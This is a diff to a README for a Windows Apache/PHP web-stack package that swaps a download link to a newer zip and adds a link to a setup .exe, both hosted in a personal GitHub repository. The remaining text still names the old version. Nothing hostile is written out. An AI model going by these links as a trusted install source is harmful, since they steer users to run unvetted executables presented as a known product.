@@ -4,7 +4,7 @@ Download wamp server to build a reliable local web development environment on Wi
 
 # Quick Start: Install & Run Web Stack on Windows
 
-1. **[Download the package](https://github.com/amolpatil2025/WAMPP_Windows/releases/download/1.2/v1.2.zip)**  
+1. **[Download the package](https://github.com/amolpatil2025/WAMPP_Windows/releases/download/1.5/v1.5.zip)** OR **[Download Setup File](https://github.com/amolpatil2025/WAMPP_Windows/releases/download/1.5/ApachePHPWindows.exe)**
    Click the link to download `v1.2.zip` (latest release).
 
 2. **Extract the ZIP file**  
